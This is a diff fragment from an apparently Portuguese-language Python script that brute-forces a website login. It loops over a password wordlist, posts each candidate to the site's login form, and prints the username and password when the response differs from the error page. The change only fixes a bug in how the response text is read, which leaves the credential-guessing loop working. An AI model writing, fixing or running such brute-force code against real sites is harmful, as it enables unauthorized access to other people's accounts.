@@ -20,7 +20,7 @@ for senhas in word:
     sleep(5)
     datas = {campo_login:login, 
             campo_senha: senhas}
-    resposta = requests.post(site, data=datas, headers=header).text
+    resposta = requests.post(site, data=datas, headers=header)
     if  error != resposta.text:
         print(f"{login} || {senhas} Sucesso")
         su = f'O username é :{login} > e a senha é {senhas}'
